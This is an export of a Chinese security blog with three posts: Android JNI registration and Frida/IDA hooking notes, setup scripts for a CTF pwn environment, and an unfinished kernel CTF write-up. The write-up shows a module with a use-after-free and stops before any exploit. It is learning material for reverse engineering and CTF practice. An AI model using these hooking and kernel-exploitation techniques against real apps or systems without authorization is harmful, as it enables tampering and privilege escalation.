class="comment">     * A native method that is implemented by the &#x27;native_lib&#x27; native library,     </span></span><br><span class="line"><span class="comment">     * which is packaged with this application.     </span></span><br><span class="line"><span class="comment">     * */</span>    </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模拟器运行 + jadx反编译 + ida 打开so文件</p>
<h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h3><ol>
<li>函数名不用这么长，但是一般会与Java层的名称相同，方便开发</li>
<li>JNI_Onload 函数，动态注册</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> classname <span class="string">&quot;com/learn/native_demo/MainActivity&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> jclass myClass;</span><br><span class="line"></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span> </span>&#123;</span><br><span class="line">	JNIEnv* env = <span class="literal">NULL</span>; </span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//1. 从JavaVM获取JNIEnv，这里使用1.4的版本</span></span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 获取映射的java类</span></span><br><span class="line">    myClass = env-&gt;<span class="built_in">FindClass</span>(className);</span><br><span class="line">    <span class="keyword">if</span>(myClass == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;cannot get class:%s\n&quot;</span>, className);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 通过RegisterNatives方法动态注册</span></span><br><span class="line">    <span class="keyword">if</span>(env-&gt;<span class="built_in">RegisterNatives</span>(myClass, gMethods, <span class="built_in">sizeof</span>(gMethods)/<span class="built_in">sizeof</span>(gMethods[<span class="number">0</span>])) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;register native method failed!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. 返回版本，否则加载会失败。</span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_4;                  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>动态注册，主要靠JNIEnv的RegisterNatives函数</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">jint <span class="title">RegisterNatives</span><span class="params">(jclass clazz, <span class="type">const</span> JNINativeMethod* methods,</span></span></span><br><span class="line"><span class="params"><span class="function">        jint nMethods)</span></span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>我们需要自定义 JNINativeMethod 数组</li>
</ol>
<ul>
<li><code>getNativeString</code>为Java类中定义的Native方法名。</li>
<li><code>()Ljava/lang/String;</code> 为方法的签名， <code>()</code>表示该方法无参数</li>
<li><code>reinterpret_cast&lt;void*&gt;(getString)</code> 为Native实现的方法名。这里强制转换成了函数指针。</li>
<li>这些函数都需要我们实现</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;getNativeString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>*&gt;(getString)&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h2 id="smali-语法"><a href="#smali-语法" class="headerlink" title="smali 语法"></a>smali 语法</h2><p>Dalvik 虚拟机：Dalvik 是 Google 专门为 Android 平台设计的虚拟机。虽然 Android 程序可以使用 Java 语言来进行开发，但 Dalvik VM 和 Java VM 是两款不同的虚拟机。Dalvik VM 基于寄存器，而 Java VM 基于栈 。Dalvik VM 有专门的文件执行格式 dex (Dalvik Executable)，而 Java VM 则执行的是 Java 字节码。DVM 比 JVM 速度更快，占用的空间更少。</p>
<p>不必要死记硬背，使用时查表，用着就熟悉了</p>
<p><a href="https://ctf-wiki.org/android/basic_operating_mechanism/java_layer/smali/smali/">Smali - CTF Wiki (ctf-wiki.org)</a></p>
<h2 id="Firda"><a href="#Firda" class="headerlink" title="Firda"></a>Firda</h2><blockquote>
<p>只能说多看官方文档</p>
</blockquote>
<p>命令使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 旧版 </span></span><br><span class="line">frida -U &lt;package_name&gt; -l hook.js  --no-pause</span><br><span class="line"><span class="comment"># 新版默认不会暂停，使用--pause 暂停 。</span></span><br><span class="line">frida-ps -Uai  // 获得名称</span><br><span class="line">frida -U  &lt;name&gt; -l hook.js </span><br></pre></td></tr></table></figure>

<p>某些方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取环境变量，就是获取 JNIEnv ，并且我们可以调用JNIEnv的方法</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型转化</span></span><br><span class="line"><span class="title function_">hexdump</span>()</span><br><span class="line"><span class="title function_">readCString</span>() </span><br><span class="line"><span class="title function_">toInt32</span>()</span><br></pre></td></tr></table></figure>

<h3 id="native-hook"><a href="#native-hook" class="headerlink" title="native hook"></a>native hook</h3><ol>
<li>获得so基址</li>
<li>获得函数基址，进行attach，两个方法，进入函数(onEnter)和退出函数(onLeave)的操作</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> lib_name = <span class="string">&quot;xxx.so&quot;</span></span><br><span class="line">  <span class="keyword">let</span> func_offset = <span class="number">0x114514</span>;</span><br><span class="line">  <span class="keyword">let</span> libc_base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(lib_name);</span><br><span class="line">  </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;libc base: &quot;</span> + libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 一般so层函数第一个参数都是JniEnv，第二个参数是jclass</span></span><br><span class="line">  <span class="keyword">let</span> func_addr = libc_base.<span class="title function_">add</span>(func_offset);</span><br><span class="line">  <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(func_addr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">      <span class="comment">// console.log(&quot;args[0] = \n&quot; + hexdump(args[0]));</span></span><br><span class="line">      <span class="comment">// console.log(&quot;args[1] = \n&quot; + hexdump(args[1]));</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[2] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">2</span>]));</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[3] = \n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">3</span>]));</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;function return&quot;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;return =&gt; &quot;</span> + <span class="title function_">hexdump</span>(retval));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h3><blockquote>
<p>卡死的几率比较高</p>
</blockquote>
<ol>
<li>获得指令的地址</li>
<li>打印上下文 context</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">  <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">context</span>))</span><br><span class="line">    <span class="comment">// 具体的寄存器值</span></span><br><span class="line">    conslole.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="IDA-Attach"><a href="#IDA-Attach" class="headerlink" title="IDA Attach"></a>IDA Attach</h2><blockquote>
<p>IDA yyds</p>
</blockquote>
<ol>
<li>手机启动 IDA Pro <code>dbgsrv</code> 中的 android_server(x86_64 或者 arm 根据机型选择)</li>
<li>端口转发</li>
<li>IDA Pro 顶栏 Debugger -&gt; Attach -&gt; Remote Android debugger</li>
</ol>
<p>需要端口转发才能attach，将android端口转发一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://developer.android.com/reference/android/os/Bundle">Bundle Android Developers</a></li>
<li><a href="https://frida.re/docs/home/">Frida • A world-class dynamic instrumentation toolkit</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/520523247?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTg3NDkwNTMsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTY5ODc0ODc1MywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM1Mjk0Njk4M30.3D24gUz7Zah8RqqqLRzUIr5z1PlHm7nDF22mMsj6zBw">JNI动态注册、静态注册实例及其实现原理分析</a></li>
</ul>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn init</title>
    <url>/2023/06/05/Pwn%20init/</url>
    <content><![CDATA[<blockquote>
<p>搭建一个pwn环境。</p>
</blockquote>
<span id="more"></span>

<ul>
<li><code>apt</code> or <code>apt-get</code>? 虽然我使用apt出现warning,但是依然能用<ul>
<li>在脚本中，更加推荐 <code>apt-get</code></li>
<li><code>-y</code> yes 避免交互而产生错误</li>
</ul>
</li>
</ul>
<h3 id="VM-or-WSL"><a href="#VM-or-WSL" class="headerlink" title="VM or WSL"></a>VM or WSL</h3><blockquote>
<p>安装必备的应用</p>
</blockquote>
<ul>
<li>root下使用，但是普通用户无法使用<code>gdb插件</code>功能，因为gdbinit文件的位置，我们可以复制一份到自己的用户目录下</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line"></span><br><span class="line">apt-get install -y patchelf</span><br><span class="line">apt-get install -y wget</span><br><span class="line">apt-get install -y zip</span><br><span class="line">apt-get install -y tzdata</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools socat ruby ruby-dev locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># python工具</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper z3-solver angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># 换源，可选</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwngdb</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuapt-getx/Pwngdb.git </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/Pwngdb/.gdbinit &gt;&gt; ~/.gdbinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># gem源</span></span><br><span class="line">gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccomp-tools</span></span><br><span class="line">gem install seccomp-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget</span></span><br><span class="line">gem install one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwninit</span></span><br><span class="line">apt-get install liblzma-dev pkgconf</span><br><span class="line">apt-get install cargo</span><br><span class="line">cargo install pwninit</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker 自己选择</span></span><br><span class="line"><span class="comment"># apt-get install docker.io</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu 自己选择</span></span><br><span class="line"><span class="comment"># apt-get install qemu qemu-system qemu-user-static binfmt-support</span></span><br></pre></td></tr></table></figure>

<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><ul>
<li><p>搭建更加容易</p>
</li>
<li><p>由于某些题目没有Libc版本，而是给出了Dockerfile。或者说，不想下载虚拟机。</p>
<ul>
<li>glibc-all-in-one 下载一个libc 进行patch(但是<code>patchelf</code>容易导致程序破坏).</li>
<li>自己的docker环境</li>
</ul>
</li>
<li><p>docker环境搭建: 更改VERSION就行，禁止交互。</p>
</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ARG</span> VERSION=<span class="number">20.04</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:$VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND noninteractive </span><br><span class="line"><span class="comment"># ENV TZ=Asia/Shanghai</span></span><br><span class="line"><span class="comment">########## solve some error ##############</span></span><br><span class="line"><span class="comment"># 定义时区参数</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># 设置时区</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># 设置编码</span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./pwninit.sh /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /root/pwninit.sh &amp;&amp; /root/pwninit</span></span><br></pre></td></tr></table></figure>

<ul>
<li>pwninit: 只需要安装部分工具</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y python3 python3-pip python3-dev lib32z1 \</span><br><span class="line"> curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line"> vim netcat iputils-ping cpio file net-tools locales \</span><br><span class="line"> autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line"> gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># others</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># 换源，可选</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>创建一个容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -h &lt;repo&gt;:&lt;tag&gt; .</span><br><span class="line"><span class="comment"># -f 指定dockerfile</span></span><br><span class="line"><span class="comment"># repo 形式 xxx/xxx</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<ul>
<li>进入docker</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu:VERSION /bin/bash</span><br><span class="line"><span class="comment"># -v dir:dir 共享文件夹</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>docker 命令</p>
<ul>
<li>-i: 交互式</li>
<li>-t: terminl</li>
<li>-v hostDir:dockerDir 共享文件夹</li>
<li>ps -a: 查看所有的容器</li>
</ul>
</li>
<li><p>停止后重新计入容器</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start &lt;ID&gt;</span><br><span class="line">docker attach &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>停止容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>删除镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi &lt;ID&gt;</span><br></pre></td></tr></table></figure>

<h4 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h4><ul>
<li>error 1</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">******</span><br><span class="line">Your encoding (ANSI_X3.4-1968) is different than UTF-8. pwndbg might not work properly.</span><br><span class="line">You might try launching gdb with:</span><br><span class="line">    LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdb</span><br><span class="line">Make sure that en_US.UTF-8 is activated <span class="keyword">in</span> /etc/locale.gen and you called locale-gen</span><br><span class="line">******</span><br></pre></td></tr></table></figure>

<ul>
<li>error 2</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/gdbinit.py&quot;</span>, line 58, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import pwndbg  <span class="comment"># noqa: F401</span></span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/__init__.py&quot;</span>, line 86, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    config_mod.init_params()</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 159, <span class="keyword">in</span> init_params</span><br><span class="line">    Parameter(p)</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 45, <span class="keyword">in</span> __init__</span><br><span class="line">    self.value = param.value</span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128)</span></span><br><span class="line"><span class="string">------- tip of the day (disable with set show-tips off) -------</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>出现了如上错误。寻找到一个<a href="https://github.com/pwndbg/pwndbg/issues/1539">issue</a></p>
</li>
<li><p>error1，修改dockerfile的类似如下变量。选择中国</p>
</li>
<li><p>error2  也解决了。</p>
</li>
</ul>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ENV LANG en_US.utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们的设置</span></span><br><span class="line"><span class="comment"># 定义时区参数</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># 设置时区</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># 设置编码</span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure>

<h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><ul>
<li>创建多个docker。</li>
</ul>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>peekgeek mmsg</title>
    <url>/2023/07/28/peekgeek%20mmsg/</url>
    <content><![CDATA[<blockquote>
<p>做题踩坑实录，赛后复现.</p>
</blockquote>
<span id="more"></span>

<h2 id="step1-init"><a href="#step1-init" class="headerlink" title="step1: init"></a>step1: init</h2><ul>
<li>拿到附件，查看启动脚本，smep, smap, kaslr，应该还有pti</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -cpu host,+smep,+smap \</span><br><span class="line">        -smp cores=1 \</span><br><span class="line">        -kernel bzImage \</span><br><span class="line">        -hda rootfs.img \</span><br><span class="line">        -nographic \</span><br><span class="line">        -monitor none \</span><br><span class="line">        -snapshot \</span><br><span class="line">        -enable-kvm \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw kaslr rdinit=/sbin/init  quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">        -no-reboot</span><br></pre></td></tr></table></figure>

<ul>
<li>ext4 镜像挂载</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"></span><br><span class="line">sudo mount rootfs.img ./rootfs</span><br></pre></td></tr></table></figure>

<ul>
<li>查看init， etc&#x2F;init.d 下的文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R root:root /</span><br><span class="line"><span class="built_in">chmod</span> 700 /root</span><br><span class="line"><span class="built_in">chown</span> -R ctf:ctf /home/ctf</span><br><span class="line"><span class="built_in">chown</span> root:root /root/flag</span><br><span class="line"><span class="built_in">chmod</span> 600 /root/flag</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span></span><br><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/kernel/kptr_restrict</span></span><br><span class="line"></span><br><span class="line">insmod /root/mmsg.ko</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/mmsg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line"><span class="comment"># setsid cttyhack su ctf -c /bin/sh</span></span><br><span class="line">setsid cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<ul>
<li>修改内容，将ko文件拷贝一份，etc&#x2F;init.d&#x2F;rcS内容修改一下，然后umount，启动。（修改效果生效必须要<strong>umount</strong>）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mount ./rootfs</span><br></pre></td></tr></table></figure>

<ul>
<li>内核版本 <code>5.10.186</code></li>
</ul>
<h2 id="step2-ko"><a href="#step2-ko" class="headerlink" title="step2: ko"></a>step2: ko</h2><ul>
<li>逆向分析ko文件（直接给出了c文件，也可以不看）。漏洞所在的地方，类似入门经典题目<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/">kernel UAF - CTF Wiki</a>。但是结构体大小0x20</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> *<span class="title">mmsg_head</span>;</span> </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">mmsg_device</span>;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> &#123;</span><br><span class="line">    kfree(mmsg_head);</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mmsg_module_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    mmsg_device.minor = MISC_DYNAMIC_MINOR;</span><br><span class="line">    mmsg_device.name = DEVICE_NAME;</span><br><span class="line">    mmsg_device.fops = &amp;module_fops;</span><br><span class="line">    misc_register(&amp;mmsg_device);</span><br><span class="line">    mmsg_head = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> mmsg_head), GFP_KERNEL);</span><br><span class="line">    <span class="built_in">strncpy</span>(mmsg_head-&gt;description, DEVICE_NAME <span class="string">&quot;-mmsg_head&quot;</span>, <span class="number">15</span>);</span><br><span class="line">    INIT_LIST_HEAD(&amp;mmsg_head-&gt;<span class="built_in">list</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mmsg_module_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    misc_deregister(&amp;mmsg_device);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li></li>
</ul>
<h2 id="step3-exploit"><a href="#step3-exploit" class="headerlink" title="step3: exploit"></a>step3: exploit</h2><ul>
<li>尝试ROP，但是不太会🤡</li>
</ul>
